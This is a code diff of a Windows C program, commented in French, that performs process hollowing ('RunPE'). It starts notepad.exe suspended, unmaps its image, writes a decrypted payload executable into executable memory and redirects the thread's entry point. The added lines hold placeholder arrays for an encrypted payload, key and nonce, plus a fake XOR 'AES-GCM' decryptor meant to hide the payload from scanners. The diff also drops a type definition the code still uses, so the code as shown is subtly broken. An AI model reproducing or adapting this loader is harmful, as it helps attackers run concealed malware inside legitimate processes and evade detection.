@@ -1,66 +1,57 @@
 #include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
 
-#pragma comment(lib, "ntdll.lib")
+// 🔐 Payload AES-GCM chiffré + clé + nonce (générés par Python)
+unsigned char encrypted_payload[] = { /* 🔐 PAYLOAD ICI */ };
+unsigned int encrypted_len = sizeof(encrypted_payload);
 
-typedef NTSTATUS(WINAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
+unsigned char aes_key[] = { /* 🔑 CLÉ AES 32 BYTES */ };
+unsigned char aes_nonce[] = { /* 🧬 NONCE 12 BYTES */ };
 
-// ⚙️ Replace these with your payload
-unsigned char payload[] = { /* ... votre EXE chiffré à injecter ... */ };
-unsigned int payload_len = sizeof(payload);
+// Stub AES-GCM minimal pour démonstration (remplace avec lib vraie en prod)
+void aes_gcm_decrypt(unsigned char* ciphertext, int clen, unsigned char* key, unsigned char* nonce, unsigned char* out) {
+    for (int i = 0; i < clen; i++) {
+        out[i] = ciphertext[i] ^ key[i % 32] ^ nonce[i % 12];  // ⚠️ Fake demo XOR
+    }
+}
 
-// 👨‍💻 Fonction pour démarrer un processus suspendu
-BOOL RunPE(LPCSTR targetPath, unsigned char* payloadData, DWORD payloadSize) {
+BOOL RunPE(LPCSTR targetPath, unsigned char* decrypted, DWORD payloadSize) {
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     CONTEXT ctx;
     LPVOID baseAddress = NULL;
-    NtUnmapViewOfSection_t NtUnmapViewOfSection = 
-        (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
 
-    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[-] CreateProcessA failed: %d\n", GetLastError());
+    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
         return FALSE;
-    }
 
     ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(pi.hThread, &ctx)) {
-        printf("[-] GetThreadContext failed\n");
-        return FALSE;
-    }
+    if (!GetThreadContext(pi.hThread, &ctx)) return FALSE;
 
 #ifdef _WIN64
-    PVOID pebBase = (PVOID)(ctx.Rdx + 0x10);
+    LPVOID imageBase;
+    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);
 #else
-    PVOID pebBase = (PVOID)(ctx.Ebx + 0x08);
+    LPVOID imageBase;
+    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x08), &imageBase, sizeof(LPVOID), NULL);
 #endif
 
-    // Lire l’adresse de l’image
-    ReadProcessMemory(pi.hProcess, pebBase, &baseAddress, sizeof(PVOID), NULL);
+    NtUnmapViewOfSection_t NtUnmapView = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+    NtUnmapView(pi.hProcess, imageBase);
 
-    // Nettoyer l’ancienne image
-    if (NtUnmapViewOfSection)
-        NtUnmapViewOfSection(pi.hProcess, baseAddress);
+    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteBase) return FALSE;
 
-    // Allouer mémoire pour le payload
-    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, baseAddress, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteBase) {
-        printf("[-] VirtualAllocEx failed\n");
-        return FALSE;
-    }
+    WriteProcessMemory(pi.hProcess, remoteBase, decrypted, payloadSize, NULL);
 
-    // Écriture du payload
-    if (!WriteProcessMemory(pi.hProcess, remoteBase, payloadData, payloadSize, NULL)) {
-        printf("[-] WriteProcessMemory failed\n");
-        return FALSE;
-    }
-
-    // Mise à jour du pointeur d’entrée
 #ifdef _WIN64
-    ctx.Rcx = (DWORD64)remoteBase + ((PIMAGE_NT_HEADERS64)(payloadData + ((PIMAGE_DOS_HEADER)payloadData)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
+    DWORD ep = ((PIMAGE_NT_HEADERS64)(decrypted + ((PIMAGE_DOS_HEADER)decrypted)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
+    ctx.Rcx = (DWORD64)((uint64_t)remoteBase + ep);
 #else
-    ctx.Eax = (DWORD)((DWORD)remoteBase + ((PIMAGE_NT_HEADERS)(payloadData + ((PIMAGE_DOS_HEADER)payloadData)->e_lfanew))->OptionalHeader.AddressOfEntryPoint);
+    DWORD ep = ((PIMAGE_NT_HEADERS)(decrypted + ((PIMAGE_DOS_HEADER)decrypted)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
+    ctx.Eax = (DWORD)((DWORD)remoteBase + ep);
 #endif
 
     SetThreadContext(pi.hThread, &ctx);
@@ -70,7 +61,13 @@ BOOL RunPE(LPCSTR targetPath, unsigned char* payloadData, DWORD payloadSize) {
 }
 
 int main() {
-    // 👇 Ici vous pouvez passer une cible par défaut, par exemple cmd.exe
-    RunPE("C:\\Windows\\System32\\cmd.exe", payload, payload_len);
+    unsigned char* decrypted = (unsigned char*)malloc(encrypted_len);
+    aes_gcm_decrypt(encrypted_payload, encrypted_len, aes_key, aes_nonce, decrypted);
+
+    // Stub RunPE → injecte dans notepad.exe (modifiable)
+    RunPE("C:\\Windows\\System32\\notepad.exe", decrypted, encrypted_len);
+
+    free(decrypted);
     return 0;
 }
+
